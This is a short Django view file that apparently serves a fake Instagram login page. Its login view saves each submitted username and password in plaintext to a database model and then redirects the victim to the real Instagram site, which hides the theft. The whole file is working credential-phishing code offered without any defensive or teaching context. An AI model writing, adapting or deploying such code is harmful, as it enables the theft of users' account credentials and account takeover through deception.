from django.shortcuts import render, redirect
from .models import Credentials

def login_view(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        # Save credentials to database
        Credentials.objects.create(username=username, password=password)
        
        # Redirect to actual Instagram
        return redirect('https://www.instagram.com/')
            
    return render(request, 'accounts/login.html')
